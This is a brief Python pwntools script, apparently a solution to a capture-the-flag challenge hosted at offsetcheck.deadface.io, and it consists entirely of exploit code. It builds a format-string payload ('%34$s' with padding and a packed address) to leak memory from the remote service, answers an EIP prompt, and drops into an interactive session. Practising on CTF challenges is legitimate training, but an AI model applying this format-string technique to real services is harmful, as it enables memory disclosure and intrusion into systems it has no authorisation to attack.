from pwn import *
import string

target = remote('offsetcheck.deadface.io', 31337)


print(target.recvuntil(b'sent to the buffer:'))

#base = 0x8048000

payload = b'%' + str(34).encode('ascii') + b'$s'
payload += b'b' * (20 - len(payload))
payload += p32(0x08048000)
print(payload)
target.sendline(payload)

print(target.recvuntil(b'Please enter what showed up in EIP:'))
target.sendline(b'a')
#print(target.recvuntil(b'Searching buffer:'))

target.interactive()